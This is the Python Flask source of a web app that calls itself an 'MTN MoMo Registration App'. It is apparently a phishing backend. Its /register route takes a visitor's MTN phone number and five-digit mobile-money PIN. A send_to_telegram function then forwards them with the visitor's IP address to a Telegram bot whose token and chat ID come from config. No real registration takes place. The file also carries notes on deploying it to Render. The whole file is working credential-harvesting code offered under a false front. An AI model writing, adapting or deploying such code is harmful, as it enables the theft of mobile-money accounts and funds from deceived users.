# Standard library imports
import os
import logging
import time
from datetime import datetime

# Third-party imports
from flask import Flask, render_template, request, jsonify
import requests

# Local imports
from config import Config

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
app.config.from_object(Config)

# Rate limiting store
rate_limit_store = {}
RATE_LIMIT = 5  # requests per minute
RATE_LIMIT_WINDOW = 60  # seconds

def is_rate_limited(ip):
    """Simple rate limiting function"""
    current_time = time.time()
    if ip not in rate_limit_store:
        rate_limit_store[ip] = []
    
    # Clean old requests
    rate_limit_store[ip] = [t for t in rate_limit_store[ip] if current_time - t < RATE_LIMIT_WINDOW]
    
    if len(rate_limit_store[ip]) >= RATE_LIMIT:
        return True
    
    rate_limit_store[ip].append(current_time)
    return False

def send_to_telegram(mtn_number, momo_pin, ip_address=None):
    """
    Send MTN number and MoMo PIN to Telegram bot
    """
    try:
        # Validate configuration
        Config.validate_config()
        
        bot_token = app.config['TELEGRAM_BOT_TOKEN']
        chat_id = app.config['TELEGRAM_CHAT_ID']
        
        # Prepare the message
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = f"""🔔 **New Registration Alert!**

📱 **MTN Number:** {mtn_number}
🔐 **MoMo PIN:** {momo_pin}

📅 **Time:** {timestamp}
🌐 **IP:** {ip_address or 'N/A'}

⚠️ **Security Notice:** This is sensitive information. Handle with care!"""
        
        # Telegram API URL
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        # Payload
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        # Send request with timeout
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        
        logger.info(f"Successfully sent registration data to Telegram for {mtn_number}")
        return True, "Registration data sent successfully"
        
    except requests.exceptions.Timeout:
        error_msg = "Telegram API timeout"
        logger.error(error_msg)
        return False, error_msg
    except requests.exceptions.RequestException as e:
        error_msg = f"Telegram API error: {str(e)}"
        logger.error(error_msg)
        return False, error_msg
    except ValueError as e:
        logger.error(str(e))
        return False, str(e)
    except Exception as e:
        error_msg = f"Unexpected error: {str(e)}"
        logger.error(error_msg)
        return False, error_msg

@app.route('/')
def index():
    """Main registration page"""
    return render_template('index.html')

@app.route('/register', methods=['POST'])
def register():
    """Handle registration form submission"""
    try:
        # Get client IP for rate limiting
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Apply rate limiting
        if is_rate_limited(client_ip):
            logger.warning(f"Rate limit exceeded for IP: {client_ip}")
            return jsonify({
                'success': False,
                'message': 'Too many requests. Please wait a minute and try again.'
            }), 429
        
        # Get form data
        mtn_number = request.form.get('mtn_number', '').strip()
        momo_pin = request.form.get('momo_pin', '').strip()
        
        # Validate input
        if not mtn_number or not momo_pin:
            return jsonify({
                'success': False,
                'message': 'All fields are required'
            }), 400
        
        # Remove spaces and plus sign for validation
        clean_number = mtn_number.replace(' ', '').replace('+', '')
        
        # Validate MTN number format
        if not clean_number.isdigit():
            return jsonify({
                'success': False,
                'message': 'Invalid MTN number format. Please enter a valid phone number.'
            }), 400
        
        if len(clean_number) < 10:
            return jsonify({
                'success': False,
                'message': 'Phone number must be at least 10 digits.'
            }), 400
        
        # Validate PIN format (5 digits)
        if not momo_pin.isdigit():
            return jsonify({
                'success': False,
                'message': 'PIN must contain only digits.'
            }), 400
        
        if len(momo_pin) != 5:
            return jsonify({
                'success': False,
                'message': 'PIN must be exactly 5 digits.'
            }), 400
        
        # Log registration attempt
        logger.info(f"Registration attempt for MTN: {mtn_number} from IP: {client_ip}")
        
        # Send to Telegram
        success, message = send_to_telegram(mtn_number, momo_pin, client_ip)
        
        if success:
            return jsonify({
                'success': True,
                'message': 'Registration successful!'
            }), 200
        else:
            return jsonify({
                'success': False,
                'message': f'Registration failed: {message}'
            }), 500
            
    except Exception as e:
        logger.error(f"Registration error: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'An unexpected error occurred. Please try again.'
        }), 500

@app.route('/health')
def health():
    """Health check endpoint for Render"""
    config_status = True
    try:
        Config.validate_config()
    except ValueError:
        config_status = False
    
    return jsonify({
        'status': 'healthy' if config_status else 'degraded',
        'telegram_configured': config_status,
        'timestamp': datetime.now().isoformat(),
        'service': 'momo-registration-app'
    })

@app.route('/api/status')
def status():
    """Detailed status endpoint"""
    return jsonify({
        'app': 'MTN MoMo Registration App',
        'version': '1.0.0',
        'environment': os.environ.get('RENDER', 'development'),
        'telegram_configured': Config.TELEGRAM_BOT_TOKEN is not None and Config.TELEGRAM_CHAT_ID is not None
    })

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    # Validate configuration on startup
    try:
        Config.validate_config()
        logger.info("✅ Configuration validated successfully")
        logger.info("🚀 Application starting...")
    except ValueError as e:
        logger.warning(f"⚠️ Configuration warning: {e}")
        logger.warning("Telegram notifications will not work until bot token and chat ID are set")
    
    # Get port from environment for Render
    port = int(os.environ.get('PORT', 5000))
    debug_mode = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    app.run(debug=debug_mode, host='0.0.0.0', port=port)